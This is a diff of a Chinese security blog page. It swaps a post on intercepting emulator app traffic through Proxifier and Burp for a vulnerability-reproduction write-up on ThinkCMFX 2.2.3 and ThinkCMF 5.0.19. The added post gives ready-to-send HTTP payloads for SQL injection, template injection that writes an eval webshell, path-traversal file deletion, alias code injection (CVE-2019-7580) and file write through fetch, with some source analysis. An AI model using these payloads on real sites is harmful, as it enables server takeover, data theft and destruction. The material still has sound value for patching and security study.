@@ -4,13 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="渗透测试 APP流量通用抓包方法, 朋与厌">
+    <meta name="keywords" content="ThinkCMFX 漏洞分析集合, 朋与厌">
     <meta name="baidu-site-verification" content>
     <meta name="google-site-verification" content>
-    <meta name="description" content="渗透测试 APP流量通用抓包方法好久不见，距离上一次水文章已经两个月过去了。 非常抱歉，让大家久等了。
-
-
-毕老师之前开会的时候提起过微信、支付宝、抖音类的App会检测手机的是否挂代理，就是说不能直接在手机代理的地方做手脚，不然就会被检测到">
+    <meta name="description" content="ThinkCMFX 漏洞分析集合ThinkCMF是一款基于ThinkPHP+MySQL开发的中文内容管理框架。ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。每个应用都能独立的">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>渗透测试 APP流量通用抓包方法 | 朋与厌Blog</title>
+    <title>ThinkCMFX 漏洞分析集合 | 朋与厌Blog</title>
     <link rel="icon" type="image/png" href="/medias/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -306,13 +303,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://i.loli.net/2019/10/26/WNuODJyGAkSp2lH.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        渗透测试 APP流量通用抓包方法
+                        ThinkCMFX 漏洞分析集合
                     </div>
                 </div>
             </div>
@@ -322,10 +319,99 @@
 
 
 
-<main class="container content">
+<main class="post-container content">
 
     
-    <!-- 文章内容详情 -->
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
 <div id="artDetail">
     <div class="card">
         <div class="card-content article-info">
@@ -334,8 +420,8 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/渗透测试/" target="_blank">
-                            <span class="chip bg-color">渗透测试</span>
+                        <a href="/tags/漏洞复现/" target="_blank">
+                            <span class="chip bg-color">漏洞复现</span>
                         </a>
                         
                     </div>
@@ -346,8 +432,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/渗透测试/" class="post-category" target="_blank">
-                            渗透测试
+                        <a href="/categories/漏洞复现/" class="post-category" target="_blank">
+                            漏洞复现
                         </a>
                         
                     </div>
@@ -358,7 +444,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-10-26
+                    2019-11-02
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -372,14 +458,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    838
+                    2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    8 分
                 </div>
                 
                 
@@ -390,53 +476,118 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="渗透测试-APP流量通用抓包方法"><a href="#渗透测试-APP流量通用抓包方法" class="headerlink" title="渗透测试 APP流量通用抓包方法"></a>渗透测试 APP流量通用抓包方法</h2><p><strong>好久不见，距离上一次水文章已经两个月过去了。 非常抱歉，让大家久等了。</strong></p>
-<p><img src="https://i.loli.net/2019/10/26/io69WNfjFtHCnVs.png" alt="1572072179795.png"></p>
-<blockquote>
-<p>毕老师之前开会的时候提起过微信、支付宝、抖音类的App会检测手机的是否挂代理，就是说不能直接在手机代理的地方做手脚，不然就会被检测到  :)</p>
+                <h3 id="ThinkCMFX-漏洞分析集合"><a href="#ThinkCMFX-漏洞分析集合" class="headerlink" title="ThinkCMFX 漏洞分析集合"></a>ThinkCMFX 漏洞分析集合</h3><p>ThinkCMF是一款基于ThinkPHP+MySQL开发的中文内容管理框架。ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本。 </p>
+<p><img src="https://i.loli.net/2019/11/02/62kNoDjaQJcpP4R.png" alt="image-20191029112026949.png"></p>
+<p>​    ThinkCMF 有两个版本 V版本和X版本  ThinkCMF V 基于ThinkPHP3 开发官方已经不再维护。 本文将对 <strong>ThinkCMFX</strong>  <strong>2.2.3</strong> 进行漏洞总结分析。 <strong>ThinkCMFX2.2.3</strong> 下载地址： <a href="https://github.com/thinkcmf/" target="_blank" rel="noopener">https://github.com/thinkcmf/</a> </p>
+<h3 id="0x00-前台-文章编辑SQL注入"><a href="#0x00-前台-文章编辑SQL注入" class="headerlink" title="0x00 前台 文章编辑SQL注入"></a>0x00 前台 文章编辑SQL注入</h3><blockquote>
+<p>在 <strong>ThinkCMFX2.2.3</strong> 版本中，存在一处SQL注入（需要普通用户权限，默认可注册），触发截图如下。 </p>
 </blockquote>
-<h2 id="0x01-Proxifier代理介绍"><a href="#0x01-Proxifier代理介绍" class="headerlink" title="0x01 Proxifier代理介绍"></a>0x01 Proxifier代理介绍</h2><p><strong>首先介绍下Proxifier：</strong></p>
-<blockquote>
-<p>​    Proxifier是一款功能非常强大的代理客户端，支持Windows XP/Vista/Win7/Win10 和 MacOS，支持http/https、socks4/5、TCP、UDP等协议，可以指定端口，指定IP，指定域名、指定程序、指定用户名密码授权等运行模式，兼容性非常好，有点类似SOCKSCAP。</p>
-<p>​    有许多网络应用程序不支持通过代理服务器工作，不能用于局域网或防火墙后面。这些会损害公司的隐私和导致很多限制。Proxifier解决了这些问题和所有限制，让您有机会不受任何限制使用你喜爱的软件。 此外，它让你获得了额外的网络安全控制，创建代理隧道，并添加使用更多网络功能的权力。</p>
-</blockquote>
-<p>​    </p>
-<h4 id="1-2-Proxifier代理流程"><a href="#1-2-Proxifier代理流程" class="headerlink" title="1.2 Proxifier代理流程"></a>1.2 Proxifier代理流程</h4><blockquote>
-<p>翻墙 | 端口转发 </p>
-</blockquote>
-<p>代理流程主要分为两步：</p>
-<p>1、添加代理服务器（Socks5）</p>
-<p>2、设置代理规则（ 设置需要设置代理 <strong>应用程序</strong>）</p>
-<p>这时候应用程序 <strong>所有流量</strong> 经过代理服务器（实现翻墙）</p>
-<p><img src="https://i.loli.net/2019/08/18/y38JpfearHFxChE.png" alt="1566039519579.png"></p>
-<p> 这样，只要选择需要代理的应用程序，比如chrome.exe，即可实现代理流量转发 </p>
-<h2 id="0x02-设立猜想"><a href="#0x02-设立猜想" class="headerlink" title="0x02 设立猜想"></a>0x02 设立猜想</h2><p>​    梳理了流程之后，一个很骚的思路就从脑子里蹦了出来：</p>
-<p>​    代理到Socks5 流量就全部走 <strong>小飞机</strong> ，也就是说小飞机就是<strong>流量的出口</strong>。</p>
-  <div align="center"><img width="100" height="120" src="https://i.loli.net/2019/10/26/zlI2ne845CJTbjE.png"></div>  
+<p><img src="https://i.loli.net/2019/11/02/Tm9HoCBVli5yqEf.png" alt="image-20191029113404364.png"></p>
+<pre class="line-numbers language-http"><code class="language-http">POST /ThinkCMFX/index.php?g=portal&amp;m=article&amp;a=edit_post HTTP/1.1
+<span class="token header-name keyword">Host:</span> localhost
+<span class="token header-name keyword">Connection:</span> close
+<span class="token header-name keyword">Cookie:</span> PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95
+<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded
+<span class="token header-name keyword">Content-Length:</span> 79
 
-<p> 注意到<strong>添加代理服务器协议处有一个HTTPS的代理方式</strong> Burp也是通过代理进行收发流量的。</p>
-<p>这样就跟浏览器挂代理抓包原理是一样的。</p>
-<p><strong>猜想建立</strong> -&gt; 用代理转发工具将流量出口代理到Burp 8080端口  </p>
-<p>​                     -&gt; 注入流量（<strong>模拟器有很多进程，其中有个进程是网络的进程</strong>）</p>
-<p> 安卓模拟器大多是使用virtualbox的虚拟网卡进行的网络通信，那么，如果直接将模拟器的网络进程的所有流量代理到burpsite即可抓取流量包，同时又绕过了关于客户端的相关校验。 </p>
-<p> 打开模拟器分析网络进程，会发现模拟器使用的网络进程有：<code>virtualbox headless fronrend</code>和<code>NoxVMHandle Frontend</code>。 </p>
-<p><img src="https://i.loli.net/2019/08/18/6yRk7JtQTKaDpns.png" alt="1566036600076.png"></p>
-<p>总体流程图如下：</p>
-<p><img src="https://i.loli.net/2019/08/18/VyMN7CgBmspZ4PR.png" alt="image.png"></p>
-<h2 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a>验证猜想</h2><h3 id="2-1-设置Proxifier代理服务器"><a href="#2-1-设置Proxifier代理服务器" class="headerlink" title="2.1 设置Proxifier代理服务器"></a>2.1 设置Proxifier代理服务器</h3><p>代理服务器设置为burp监听端口。</p>
-<p><img src="https://i.loli.net/2019/10/26/hyzJKiCj6217eNs.png" alt="1572071477649.png"></p>
-<h3 id="2-2-设置代理规则"><a href="#2-2-设置代理规则" class="headerlink" title="2.2 设置代理规则"></a>2.2 设置代理规则</h3><p>将<code>NoxVMHandle Frontend</code>进程对应的应用程序文件加入代理规则。</p>
-<p><img src="https://i.loli.net/2019/10/26/myaVUqeWZvJkjfd.png" alt="1572071517431.png"></p>
-<h3 id="2-3-安装证书"><a href="#2-3-安装证书" class="headerlink" title="2.3 安装证书"></a><strong>2.3 安装证书</strong></h3><p>这里不再详细讲。 </p>
-<p>虚拟机都是用的虚拟网卡 不能直接访问到宿主机</p>
-<p><img src="https://i.loli.net/2019/08/18/8ZcpQOV9B2HUCnd.png" alt="1566045141291.png"></p>
-<p>将Burp的CA证书文件复制到模拟器安装就可以了</p>
-<h3 id="2-4-抓取流量包"><a href="#2-4-抓取流量包" class="headerlink" title="2.4 抓取流量包"></a>2.4 抓取流量包</h3><p> 配置之后，即可在proxifier中获取到模拟器内对应app的流量 </p>
-<p>这样模拟器的流量就全部走向Burp了 </p>
-<p><img src="https://i.loli.net/2019/08/18/ufnMjyZVIN9tFiW.png" alt="1566045307683.png"></p>
-<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>微信登录数据包</p>
-<p><img src="https://i.loli.net/2019/08/18/S2ygPmRKVMltanC.png" alt="1566045296943.png"></p>
-<p><img src="https://i.loli.net/2019/08/18/gZwlNuF9WtfzYqK.png" alt="1566046032964.png"></p>
+post[id][0]=bind&amp;post[id][1]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p> 因为其他代码中对于 <strong>id</strong> 的获取写法都是类似 <strong>I(‘get.id’,0,’intval’)</strong> 。用 <strong>intval</strong> 函数进行强转，而这里明显像是忘记了。可控变量 <strong>$article[‘id’]</strong> 来自 <strong>POST</strong> ，未经过滤直接作为 <strong>where</strong> 条件进行查询，最终导致 <strong>SQL注入漏洞</strong> 。</p>
+<p><img src="https://i.loli.net/2019/11/02/O8ad2Yot41TyzrJ.png" alt="image-20191029115949352.png"></p>
+<p> 如下图所示，框架底层将数据进行了拼接 </p>
+<p><img src="https://i.loli.net/2019/11/02/wqOx3RjT8V6dCkr.png" alt="image-20191029120131697.png"></p>
+<h3 id="0x01-前台-Comment、-Api-类模版引擎注入演示"><a href="#0x01-前台-Comment、-Api-类模版引擎注入演示" class="headerlink" title="0x01 前台 Comment、 Api 类模版引擎注入演示"></a>0x01 前台 Comment、 Api 类模版引擎注入演示</h3><blockquote>
+<p>在 <strong>ThinkCMFX2.2.3</strong> 最终版中， 存在2处前台代码执行 发送如下数据包后，会在网站根目录生成一个名为 <strong>test.php</strong> 的 <strong>webshell</strong> 。（该漏洞仅能在 <strong>Windows</strong> 下触发） </p>
+</blockquote>
+<p><strong>Comment</strong></p>
+<pre class="line-numbers language-http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> http://192.168.0.112/ThinkCMFX/index.php?g=Comment&amp;m=Widget&amp;a=fetch HTTP/1.1</span>
+<span class="token header-name keyword">Host:</span> 192.168.0.112
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded
+<span class="token header-name keyword">Cache-Control:</span> max-age=0
+<span class="token header-name keyword">Content-Length:</span> 117
+
+templateFile=/../public/index&amp;prefix=''&amp;content=&lt;php>file_put_contents('test.php','&lt;?php eval($_REQUEST[11]);')&lt;/php><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>Api</strong></p>
+<pre class="line-numbers language-http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> http://192.168.0.112/ThinkCMFX/index.php?g=Api&amp;m=Plugin&amp;a=fetch HTTP/1.1</span>
+<span class="token header-name keyword">Host:</span> 192.168.0.112
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded
+<span class="token header-name keyword">Cache-Control:</span> max-age=0
+<span class="token header-name keyword">Content-Length:</span> 121
+
+templateFile=/../../../public/index&amp;content=&lt;%3fphp+file_put_contents('test.php','&lt;%3fphp+eval($_POST[_])%3b');?>&amp;prefix=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/02/5fb8uTNOY3CIWwc.png" alt="image-20191029135650753.png"><br>     这个漏洞的主要成因是：程序未对模板文件名进行过滤，且接口权限控制不严。在模板名可控、文件内容可控的情况下，content 输入了php代码所以他会在本地跟路径创建一个一句话木马test.php,该漏洞仅能在 <strong>Windows</strong> 下触发。</p>
+<p><img src="https://i.loli.net/2019/11/02/MDiN31uPosmKE8q.png" alt="image-20191029134814194.png"><br> 在下图第68行处，会对模板文件 <strong>$templateFile</strong> 是否存在进行一个判断，如果不存在就会报错退出。而在此之前第67行，会在模板名前面拼接一个路径，但是我们却可以使用 <strong>../</strong> 字符来控制这个 <strong>$templateFile</strong> ，使其绕过文件是否存在的判断。</p>
+<p>（下图对应文件位置：<code>application/Comment/Controller/WidgetController.class.php</code>） </p>
+<p><img src="https://i.loli.net/2019/11/02/hVvHrqZ5aDTBdRf.png" alt="image-20191029134943603.png"><br> 因为我们是直接通过路由访问到这个接口的，所以此时 <strong>$templateFile</strong> 变量的值为 <strong>THEME_PATHComment/../public/index.html</strong> ，而程序本意肯定是定义了 <strong>THEME_PATH</strong> </p>
+<p> <strong>THEME_PATHComment</strong> 这个目录肯定是不存在的，而在 <strong>Windows</strong> 下允许 <strong>不存在目录/../public/index.html</strong> ， <strong>Linux</strong> 下是不行的，所以这个漏洞只能在 <strong>Windows</strong> 下利用。 </p>
+<p> 当缓存文件不存在时，程序会将我们传入的内容写进缓存文件 </p>
+<p><img src="https://i.loli.net/2019/11/02/WXdvU9VwbOPsn6D.png" alt="image-20191029135231346.png"></p>
+<p><img src="https://i.loli.net/2019/11/02/3EwUzjJWGT6dq2B.png" alt="image-20191029135310475.png"><br> 之后再包含这个缓存文件，最终导致代码执行。 </p>
+<p><img src="https://i.loli.net/2019/11/02/TIuZ2FXNw967YcR.png" alt="image-20191029135332417.png"></p>
+<p>随后访问<code>http://192.168.0.112/ThinkCMFX/test.php</code> 就是刚才写入的Webshell</p>
+<h3 id="0x02-上传头像处任意文件删除"><a href="#0x02-上传头像处任意文件删除" class="headerlink" title="0x02  上传头像处任意文件删除"></a>0x02  上传头像处任意文件删除</h3><p>1</p>
+<blockquote>
+<p>在用户上传头像处存在任意文件删除漏洞，发送如下数据包后，会删除网站根目录下一个名为 <strong>P1Kaju.txt</strong> 的文件。（该漏洞仅能在 <strong>Windows</strong> 下触发） </p>
+</blockquote>
+<pre class="line-numbers language-http"><code class="language-http">POST /ThinkCMFX/index.php?g=User&amp;m=Profile&amp;a=do_avatar HTTP/1.1
+<span class="token header-name keyword">Host:</span> 192.168.0.112
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20081302 Firefox/50.0
+<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded
+<span class="token header-name keyword">Content-Length:</span> 29
+
+mgurl=..\..\..\..\..\P1Kaju.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p> 每次上传头像后， <strong>ThinkCMFX2.2.3</strong> 将新的头像地址写入数据库，并将先前的头像删除。程序这里对符号 <strong>/</strong> 进行了过滤，就是为了防止路径穿越问题。然而在 <strong>Windows</strong> 下，却允许 <strong>....\头像文件</strong> 这种写法，所以也是为什么这个漏洞仅在 <strong>Windows</strong> 下可利用。（下图对应文件位置：<code>application/User/Controller/ProfileController.class.php</code>） </p>
+<p><img src="https://i.loli.net/2019/11/02/2wdrSMG13NEF9Ut.png" alt="image-20191029140937636.png"></p>
+<p> 从文件可以看到 <code>$imgurl=str_replace(&#39;/&#39;,&#39;&#39;,$imgurl);</code> 过滤了 / 但是没有过滤 所以我们无法引入 / 并且在更新头像以后还会从前端接收参数 imgurl 带入函数<code>sp_delete_avatar</code> 跟进去 </p>
+<h3 id="0x03-分类管理模板注入-CVE-2019-7580-需要admin权限）"><a href="#0x03-分类管理模板注入-CVE-2019-7580-需要admin权限）" class="headerlink" title="0x03 分类管理模板注入 (CVE-2019-7580 需要admin权限）"></a>0x03 分类管理模板注入 <em><em>(CVE-2019-7580 </em></em>需要admin权限）</h3><blockquote>
+<p>在 <strong>ThinkCMF5.0.19</strong> 这个版本后台提供路由自定义，其中路由的别名对单引号缺少过滤，导致引发漏洞。 </p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/02/EylYqHLMFho4ZXi.png" alt="image-20191029143132713.png"></p>
+<pre class="line-numbers language-http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> http://192.168.0.147/portal/admin_category/addpost.html HTTP/1.1</span>
+<span class="token header-name keyword">Host:</span> 192.168.0.147
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<span class="token header-name keyword">Accept-Language:</span> zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
+<span class="token header-name keyword">Connection:</span> close
+<span class="token header-name keyword">Cookie:</span> thinkphp_show_page_trace=0|0; PHPSESSID=vul4kkt8su0po91d6kc28ho2vb; thinkphp_show_page_trace=0|0; admin_username=1%40qq.com
+<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1
+<span class="token header-name keyword">Content-Length:</span> 65
+
+parent_id=0&amp;name=111&amp;alias=1'%3D%3Earray(%22%22)%2Cphpinfo()%2C'2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过”添加分类” -&gt; 分类别名处输入恶意代码<code>1&#39;=&gt;array(&quot;&quot;),phpinfo(),&#39;2</code></p>
+<p><img src="https://i.loli.net/2019/11/02/dUW1lGMfOagI9vo.png" alt="image-20191029142805050.png"></p>
+<p>刷新就能够看到代码执行成功。</p>
+<p><img src="https://i.loli.net/2019/11/02/byPtMOxQ9izuJkU.png" alt="image-20191029142851626.png"></p>
+<h3 id="0x04-ThinkCMFX-文件包含漏洞-可写入任意文件"><a href="#0x04-ThinkCMFX-文件包含漏洞-可写入任意文件" class="headerlink" title="0x04 ThinkCMFX 文件包含漏洞(可写入任意文件)"></a>0x04 ThinkCMFX 文件包含漏洞(可写入任意文件)</h3><p> 通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件,phpinfo版payload如下： </p>
+<pre class="line-numbers language-http"><code class="language-http">GET http://192.168.0.112/ThinkCMFX/?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php>file_put_contents('test.php','&lt;?php phpinfo(); ?>')&lt;/php>  HTTP/1.1
+<span class="token header-name keyword">Host:</span> 192.168.0.112
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<span class="token header-name keyword">Accept-Language:</span> zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
+<span class="token header-name keyword">Connection:</span> close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/02/VpbRTBHiOgMevZ4.png" alt="image-20191029143839192.png"></p>
+<p>然后访问test.php，可以看到phpinfo已经加载出来 </p>
+<p><img src="https://i.loli.net/2019/11/02/ZjIkdO2riUK4qPl.png" alt="image-20191029144007923.png"></p>
+<h4 id="分析分析"><a href="#分析分析" class="headerlink" title="分析分析"></a>分析分析</h4><p>首先打开index.php文件找到项目路径，然后定位到application路径下。<br><img src="https://i.loli.net/2019/11/02/AgS4TWMCJXxLd8K.png" alt="image-20191029144230595.png"></p>
+<p> 在项目路径下找到入口分组的控制器类选择<strong>IndexController</strong> 控制器类打开 </p>
+<p><img src="https://i.loli.net/2019/11/02/gRB8TK3yskHUhqr.png" alt="image-20191029144410688.png"><br> 打开<code>application/Portal/Controller/IndexController</code>，发现display方法，继续追踪HomebaseController </p>
+<p><img src="https://i.loli.net/2019/11/02/zBI9cM5P34foUXF.png" alt="image-20191029144518781.png"></p>
+<p> 通过HomebaseController，找到display方法，display函数的作用是加载模板和页面输出，templateFile为模板文件地址，charset为模板字符集，contentType为输出类型，content为输出内容。另外存在public权限的函数还有fetch，fetch函数的作用是获取页面内容，templateFile为模板文件，content为输出内容，prefix为模板缓存前缀。 </p>
+<p> templateFile参数会经过parseTemplate函数处理，判断模板是否存在，当模板不存在时会在当前目录下开始查找，这里可以配合一处上传形成文件包含。</p>
+<p>因此形成的payload ：</p>
+<pre class="line-numbers language-http"><code class="language-http">index.php?a=display&amp;templateFile=README.md <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/02/jfi96EsxAbTwBHz.png" alt="image-20191029144736031.png"></p>
+<p> fetch函数的作用是获取页面内容，调用内置模板引擎fetch方法，thinkphp的模版引擎使用的是smarty，在smarty中当key和value可控时便可以形成模板注入。<br><img src="https://i.loli.net/2019/11/02/rfbmWisO5eLtnR2.png" alt="image-20191029144805554.png"></p>
+<p> 这里fetch函数的三个参数分别对应模板文件，输出内容，模板缓存前缀。利用时templateFile和prefix参数可以为空，在content参数传入待注入的php代码即可。最终形成的</p>
+<p>payload：</p>
+<pre class="line-numbers language-http"><code class="language-http">?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php>file_put_contents('test.php','&lt;?php phpinfo(); ?>')&lt;/php><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h3><p><a href="https://xz.aliyun.com/t/3529" target="_blank" rel="noopener">https://xz.aliyun.com/t/3529</a></p>
+<p><a href="https://github.com/thinkcmf/cmfx/issues/26" target="_blank" rel="noopener">https://github.com/thinkcmf/cmfx/issues/26</a></p>
 
             </div>
             <hr />
@@ -596,9 +747,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《渗透测试 APP流量通用抓包方法》
+                    《ThinkCMFX 漏洞分析集合》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/10/26/app-traffic-general-packet-capture-method/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/02/thinkcmfx/" property="cc:attributionName"
                rel="cc:attributionURL">
                 朋与厌
             </a> 采用
@@ -639,7 +790,7 @@
         repo: 'P1Kaju.github.io',
         owner: 'P1Kaju',
         admin: "P1Kaju",
-        id: '2019/10/26/app-traffic-general-packet-capture-method/',
+        id: '2019/11/02/thinkcmfx/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -660,11 +811,12 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/11/01/thinkcmfx/">
+                <a href="/2019/11/02/thinkcmfx/">
                     <div class="card-image">
                         
                         
@@ -680,9 +832,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -695,6 +847,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -713,30 +866,30 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/09/15/steam/">
+                <a href="/2019/11/01/solr/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Steam Windows客户端本地提权0day">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Ahache Solr velocity模板命令执行漏洞">
                         
-                        <span class="card-title">Steam Windows客户端本地提权0day</span>
+                        <span class="card-title">Ahache Solr velocity模板命令执行漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            适用于Windows系统流行得Steam游戏客户端存在提权0Day漏洞，该漏洞可允许具有低权限攻击者以管理员身份运行程序
+                            国外安全研究员 s00py 在 Twitter 公开了 Apache Solr Velocity 模版注入远程命令执行的 EXP
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-15
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-01
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/系统漏洞/" class="post-category" target="_blank">
-                                    系统漏洞
+                            <a href="/categories/漏洞复现/" class="post-category" target="_blank">
+                                    漏洞复现
                                 </a>
                             
                             
@@ -746,8 +899,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/系统漏洞/" target="_blank">
